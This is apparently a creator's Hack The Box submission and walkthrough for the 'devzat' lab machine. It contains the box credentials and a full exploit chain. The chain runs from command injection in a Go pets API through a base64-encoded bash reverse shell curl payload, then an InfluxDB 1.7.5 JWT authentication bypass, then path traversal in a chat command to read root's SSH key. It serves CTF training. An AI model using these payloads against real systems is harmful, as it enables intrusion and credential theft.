# devzat

## Introduction

**My personal motivation for creating this box is:**
Browsing reddit content I stumbled upon a release of an app written in golang which gives you the possibility to chat using nothing more than a ssh client. Basically you do `ssh -l username server-ip` and will be mounted into a feature rich chat app (devzat - like 'where the devs at'). I liked this idea and tried it out with the given test server. There I met the actual developer (a 15 year old student from Dubai) and chatted along with him. I totally liked his energy and the inventional spirit he has. So I decided to take his chat app (MIT licensed) and alter it to be vulnerable intentionally. And around this app I designed this box to be vulnerable as well and eventually misuse *devzat* to gain root privileges. For this purpose I rewrote big amounts of the app and added a vulnerable feature to be used to privesc. Personally I totally love `go` and did miss this kind of content at HTB. I also love the exploit chain I designed for being straight forward, not puzzly, somewhat realistic and I love the fact that you return to the very beginning after being deep into the box. I think the player will profit from having to look at actual code to understand what is happening.

**The intended scenario is:**

This box is designed to get players hacking the machine of a not so experienced developer playing around with one of his *products* - a chat app over ssh written in go. The indended exploit chain to get inital access to the box as *patrick* (the developer) is to leverage a **Remote Code Execution** vulnerability **in** a custom designed **go web application with underlying API** to manage his pets. The attacker can find the vulnerability by using **static code analysis** of the code provided at directory **.git** of the api service. After you gain the **initial foothold** on the machine **as patrick** you will find an E-mail sent by **root** to tell you there is a **InfluxDB database** to administer things, ready and waiting for patrick to be used. This **version 1.7.5** of the database (running in a **docker container**) suffers from a **known vulnerability** which can be exploited to **bypass authentication** and **retrieve catherines password**. After logging in as user **catherine** you will see **another E-mail** from **patrick** sent to her, telling her that he introduced an **alpha release** of the feature she wanted in the **chat app**. It is hosted as a **locally bound** dev instance of that chat. He mentions their **default backup location** (is meant to be /var/backups) to see the **main and the dev source** of the app. So catherine should be able to get the **static password** to use the function by **looking at the actual code**. The **new function can print a file** from filesystem to the chat and suffers from a **Directory Traversal vulnerablility**. As the service is **running as root** catherine can login to the chat instance and either **view the root flag** or roots **id_rsa** to gain access to the system as **root**.

## Info for HTB

### Access

Passwords:

|user|password|keyfiles|
|---|---|---|
|patrick|weong3Yooquo3eijieBizai1siemoig9|-|
|catherine|woBeeYareedahc7Oogeephies7Aiseci|-|
|root|HohQu2ugiex2eec5Zohqueiyai3vei6y|ssh/root\@devzat.htb.key|
|file function in dev version of chat|CeilingCatStillAThingIn2021?|-|

### Key Processes

#### External
There are a view externally exposed processes the player can tinker with.

SSH:
- will only accept key authentication

Apache 2 is hosting two webservers:
- default redirects to devzat.htb
- devzat.htb - default landing page has instructions on how to use stable version of devzat via ssh
- pets.devzat.htb - Pet inventory web application and web service
	- with RCE vulnerability in one parameter
	- Cleanes up after itself every 5 seconds

Secure version of **devzat**:
- Chat program written in go
- Started as systemd service with helper script to maintain stability and restart handling


#### Internal
There are also a view interal processes which are for progressing to root.

SMTP:
- this is meaningless. It was only used to send the mails needed for progression and the story line

InfluxDB 1.7.5 - Docker Container
- The database is running in a docker container exposing a port
- The user can progress from inital foothold to another user
- Vulnerability: Authentication Bypass

Insecure version of **devzat**
- Chat program written in go
- Started as systemd service with helper script to maintain stability and restart handling
- "Enhanced" with a nice feature, which suffers from a Path Traversal vulnerability


### Automation / Crons

There are not much automations going on. Every service is started via **systemd** and should be running when starting the box. They did in several test runs at my machine.

The docker container with the influxdb is started via `cron` liek:

```bash
# root -> crontab -e

@reboot docker run --rm -d -v /var/lib/influxdb:/var/lib/influxdb --entrypoint ./entrypoint.sh -p 127.0.0.1:8086:8086 influx-db:1.7.5 influxd > /dev/null 2>&1
```



### Firewall Rules

There are no firewall rules other than default installation of Ubuntu Server and docker in place:
```bash
root@devzat:~# iptables -S
-P INPUT ACCEPT
-P FORWARD DROP
-P OUTPUT ACCEPT
-N DOCKER
-N DOCKER-ISOLATION-STAGE-1
-N DOCKER-ISOLATION-STAGE-2
-N DOCKER-USER
-A FORWARD -j DOCKER-USER
-A FORWARD -j DOCKER-ISOLATION-STAGE-1
-A FORWARD -o docker0 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A FORWARD -o docker0 -j DOCKER
-A FORWARD -i docker0 ! -o docker0 -j ACCEPT
-A FORWARD -i docker0 -o docker0 -j ACCEPT
-A DOCKER -d 172.17.0.2/32 ! -i docker0 -o docker0 -p tcp -m tcp --dport 8086 -j ACCEPT
-A DOCKER-ISOLATION-STAGE-1 -i docker0 ! -o docker0 -j DOCKER-ISOLATION-STAGE-2
-A DOCKER-ISOLATION-STAGE-1 -j RETURN
-A DOCKER-ISOLATION-STAGE-2 -o docker0 -j DROP
-A DOCKER-ISOLATION-STAGE-2 -j RETURN
-A DOCKER-USER -j RETURN
```


### Docker

Docker is used to host the vulnerable **influxdb** instance. It is started by cron job (see above). There is no Dockerfile as I installed the docker instance by hand starting at a given influx-db image.

### Other

Those information are vague and more like an overview. With the submission of this document you received quite comprehensive notes on every single step and process, application, target, vulnerability and such. The folder structure is explained here:

```bash
> tree -L 2
.
├── devzat
│   ├── 00 - Creds.md
│   ├── 01 - Machine Character.md
│   ├── 05 - Initial foothold.md
│   ├── 25 - Traversing to catherine.md
│   ├── 45 - Privilege escalation to root.md
│   ├── 99 - Cleanup.md
│   ├── jwt.png
│   └── Submission Writeup.md
├── init-foothold
├── landing
├── lateral
│   └── influxdb-init.iql
├── ova
│   └── devzat.ova
├── privesc
│   ├── dev
│   └── main
└── ssh
```

#### devzat
This is the document you are reading. It also containes a lot of more information about the single components. I used `obsidian` to write this document.
- 00 - Creds: Creds overview
- 01 - Machine Character: Plot and Service description
- 05 - Initial foothold: Setup of Apache2 and a detailed description of the vulnerable api for inital foothold
- 25 - Traversing to catherine: Setup of the vulnerable influxdb docker container and detailed description of the vulnerability
- 45 - Privilege escalation to root: Setup of the vulnerable service and detailed description of the vulnerability
- 99 - Cleanup: Where to touch for network setup after submission

#### init-foothold
This has the source code of the vulnerable API for initial foothold
#### landing
This has the source code of the static landing page
#### lateral
This has the prestage file with the database content
#### ova
This has the importable ova machine file for you to deploy
#### privesc
There are two folders. `main` has the source code of the stable version of chat which is secure. `dev` has the source code of the alpha version of chat which is insecure.
#### ssh
This has ssh keys and pubs for patrick and root.

## Writeup

### Enumeration

#### Nmap
Using Nmap we can find ssh, apache2 and a highport running.

```bash
sudo nmap -sC -sV -oA nmap/devzat -v 192.168.17.129
```

![[nmap-1.png]]
![[nmap-2.png]]

We will find ssh and apache2 running on the usual ports and a high port which looks like another ssh service.

#### Landing page
Browsing to the port 80 it will tell us to use `devzat.htb`. The browser is redirecting there.


So adding `devzat.htb` to `/etc/hosts` will give us a static landing page.

![[etc-hosts-1.png]]
![[landing-page.png]]


#### Chat
The landing page tells us to look at the service at port *8000* so we will.

![[chat-landing-page.png]]

```bash
ssh -l c1sc0 devzat.htb -p 8000
```

Using ssh we can dial in. But after enumerating a little we seam not to get anything from this service by now.

![[chat-stable-version.png]]

#### Gobuster
So next up we enumerate a bit further. `Gobuster` in dir mode on the landing page will not get us much more.

#### wfuzz

Using `wfuzz` for subdomain and vhost enumeration will get you `pets`.

```bash
wfuzz -c -w ~/tools/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://devzat.htb' -H "Host: FUZZ.devzat.htb" --hw 26
```

![[wfuzz-subdomain.png]]

Quickly add this to your `/etc/hosts` and then investigate the site.

![[etc-hosts-2.png]]

#### Pets Inventory
You can now visit the page and will be presented with a pets inventory webapp.

![[pets-inventory-1.png]]

By using the form you could add a pet to the inventory. You can discover that it will vanish after around 5 seconds, though.

![[pets-inventory-2.png]]

#### Gobuster again
Gobustering the page you can discover there is a `.git` folder with directory listing enabled.

```bash
gobuster dir -w ~/tools/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://pets.devzat.htb/ -b 200
```

![[gobuster-git-folder.png]]
![[git-repo-dirlisting.png]]

#### Git dumper
The tool [git-dumper](https://github.com/arthaud/git-dumper) is able to just grab the source to be inspected.

![[git-dumper-1.png]]
[... snip ...]
![[git-dumper-2.png]]

### Foothold
By inspecting the source we can see a vulnerable function in this Pet Inventory app. It looks like the added pet will parse it's characteristics by using the os command `cat` to "load" the content of a predefined file.

![[petshop-source.png]]
![[car-dirlisting.png]]

But it is not done in a secure way. The source just concatenates the cat command with whatever is received as a "species".

So now we have two opportunities. Either we hook ourselfs in with a intercepting proxy like BurpSuite or we use curl. As a proof of concept I will use curl.

But first let's see what we need to provide to the service by looking at developer console of firefox when adding a pet.

![[firefox-devtools.png]]
![[firefox-devtools-2.png]]

First of all it is a POST request to http://pets.devzat.htb/api/pet and it needs to contain a json body in this format:

```json
{
	"name": "My Test Cat",
	"species": "cat"
}
```

As we learned from the static code analysis we can inject into *species*. So we will. As I mentioned you could do that with Burp, but I will just you curl.

#### Payload

To have a nice uncomplicated payload which will not break when sent through the API I constructed a bash reverse shell and base64 encoded it like so:

```bash
> ifconfig vmnet1
vmnet1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.17.1  netmask 255.255.255.0  broadcast 192.168.17.255
        inet6 fe80::250:56ff:fec0:1  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:c0:00:01  txqueuelen 1000  (Ethernet)
        RX packets 120272  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 78997  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

> echo "bash -i  >& /dev/tcp/192.168.17.1/9001 0>&1 " | base64 -w 0
YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC4xNy4xLzkwMDEgMD4mMSAK%    
```

So the payload will be 
```json
{
	"name": "my pwn cat",
	"species": "cat; echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC4xNy4xLzkwMDEgMD4mMSAK | base64 -d | bash"
}
```

Be sure to start a listener and then send the following curl command:

```bash
curl -X POST "http://pets.devzat.htb/api/pet" -d '{"name":"my pwn cat","species":"cat; echo YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTkyLjE2OC4xNy4xLzkwMDEgMD4mMSAK | base64 -d | bash"}' -H "'Content-Type': 'application/json'"
```

![[curl-petshop.png]]
![[revshell-pops.png]]

#### SSH Key
Now we are `patrick` and luckily we can write to `~/.ssh`. So we create/add our key in the file `authorized_keys` there to gain a "checkpoint" and a stable ssh shell.

![[ssh-key-patrick.png]]

As there also was his ssh key `id_rsa` we could have downloaded that instead. I chost to just add mine.

![[patrick-ssh-in.png]]

#### Hint on how to progress

We can see from a directory listing that there is no *user.txt*. `/etc/passwd` will give us another user called `catherine`. Looking at her home directory there is the *user.txt* and we cannot access it. So we sure need to do lateral movement.

![[patrick-home.png]]
![[etc-passwd.png]]
![[catherine-home-no-access.png]]

How to progress? If you login to the chat service with the user name `patrick` you get a conversation backlog between `admin` and `patrick` which tells you that there is an InfluxDB running with a specific Version `1.7.5`.

```bash
ssh -l patrick -p 8000 localhost
```

![[patrick-hint-chat.png]]

#### InfluxDB

There is in fact an InfluxDB running. You can find it locally bound by looking at `netstat`:

![[netstat-influxdb.png]]

### Lateral Movement
Now we are on to do lateral movement from *patrick* to *catherine*.

#### Authentication Bypass
Researching vulnerabilities for the specific version 1.7.5 of influx-db will lead us to a a `Authentication Bypass` Vulnerability.
The best information in my opinion can be found at [snyk](https://snyk.io/vuln/SNYK-GOLANG-GITHUBCOMINFLUXDATAINFLUXDBSERVICESHTTPD-1041719). They also link to a specific code line of `jwt_tool` [here](https://github.com/ticarpi/jwt_tool/blob/a6ca3e0524a204b5add070bc6874cb4e7e5a9864/jwt_tool.py#L1368) which tells us we need to use a blank "password" when creating a jwt token.

So first of all we need to figure what influx-db wants as a jwt token payload and format. The [official documentation](https://docs.influxdata.com/influxdb/v1.7/administration/authentication_and_authorization/) comes in handy here.

![[influxdb-jwt-documentation.png]]

#### Exploit it
So all we need to do is craft a valid token with a username and an empty secret. The educated guess for username, as well as the signature in the mail from root to patrick let's one suggest the username has to be `admin`. Adding for example 1 year of epoch time to the current timestamp by using the [link](https://www.unixtimestamp.com/index.php) from the documentation will give you the following [jwt.io](https://jwt.io/) settings and the resulting token:

![[crafted-jwt-token.png]]

Now that we have our valid bypass token we can use curl like [documented](https://docs.influxdata.com/influxdb/v1.7/guides/querying_data/) and enumerate the database:

![[find-database.png]]

We successfully bypassed the authentication and can now see that there is a database called `devzat`.

![[find-table.png]]

So there is a table called `user`. Then let's see what is in there:

![[list-table-user.png]]

Now we can read *catherines* password.

#### Switch User
As we are already on the box we can switch users just like:

```bash
su - catherine
```

Then provide her password.

![[su-catherine.png]]

Now we have the *user.txt* flag.

#### SSH Key
We again add our ssh key to `authorized_keys` to be able to dial in as *catherine* via ssh directly.

![[ssh-key-catherine.png]]

![[catherine-ssh-in.png]]

#### Hints on how to progress
Once again in a repetitive manner we can login to the chat instance as `catherine` and will see another hint pointing us to a local dev instance of the chap application.

```bash
ssh -l catherine -p 8000 localhost
```
 
![[catherine-privesc-hint.png]]

In fact there is another instance of the chat we already saw, which is running @ localhost:8443 we can determine by looking again at `netstat -tulpen`.

![[netstat-dev-instance.png]]

Also there are the sources somewhere in a backups location. Let's enumerate.

#### Diff sources

After enumerating a little we find the source code to be at `/var/backups/` in two separate zip archives.

![[var-backups.png]]

To further inverstigate we copy them over to our attackers host using scp.

![[scp-chat-source.png]]

Now we unpack them like:

```bash
unzip <zip-file>
```

![[new-unzip-chat-source.png]]

We could just browse through the code again and search for interesting parts. But the mail told us we could do a `diff`. And this will be much easier I suggest.

The main difference is within the file `commands.go` as the diff will tell you:

![[diff-chat-source.png]]

Also it can be noticed how *patrick* changed the main function to be on another port and bound only locally:

![[diff-chat-source-2.png]]

Finally there was a file added with the dev source:

![[diff-chat-source-3.png]]

### Privilege Escalation

So for the privilege escalation part we will look further into static code analysis and see if there is another vulnerablility.

Logging in with *catherine* to the dev instance of chat we can clearly see the new and added command:

![[chat-catherine.png]]

#### Code analysis

![[chat-source.png]]

As you can see there is:
1. The need to provide two parametes, which are path and password
2. A check against a hard coded secret `CeilingCatStillAThingIn2021?`, which is the needed secret

And looking at the source again we can see that the path we control will be used to construct a path and to read a file from that path:

![[chat-source-2.png]]

We can also see that the path will not be sanitized in any way. So we can safely assume that this will be vulnerable to Path Traversal then.

#### Chat Instance - LFI + Path Traversal

So let us test out what this function can do. First we will try to include a file in our working directory:

![[exploit-chat-1.png]]

Sure enough it did include the file which was added with the dev source.

Next up `path traversal`

![[exploit-chat-2.png]]

And again, sure enough we get the content of `/etc/passwd`.

#### Fetch SSH-Key
Finally we go in for the kill.

![[explit-chat-3.png]]

There we have it. The ssh key of `root`.

#### Login as root

So now we just need to insert that in a key file on our host and cleanup the unwanted content:

![[craft-root-key.png]]

```bash
chmod 600 root.key
ssh -i root.key -l root 192.168.17.129
```

![[rooted-new-new.png]]

And that's it. We are finally root.

